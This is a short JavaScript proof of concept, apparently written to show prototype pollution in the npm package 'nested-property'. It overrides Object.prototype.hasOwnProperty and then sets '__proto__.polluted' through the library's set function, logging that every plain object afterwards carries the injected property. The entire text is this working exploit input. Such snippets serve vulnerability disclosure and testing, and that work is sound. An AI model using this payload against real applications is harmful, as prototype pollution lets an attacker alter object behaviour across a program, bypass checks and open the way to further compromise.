Object.prototype.hasOwnProperty = () => true;
const nestedProperty = require('nested-property');
const object1 = {};
console.log({}.polluted);
nestedProperty.set(object1, '__proto__.polluted', 'yes');
console.log({}.polluted);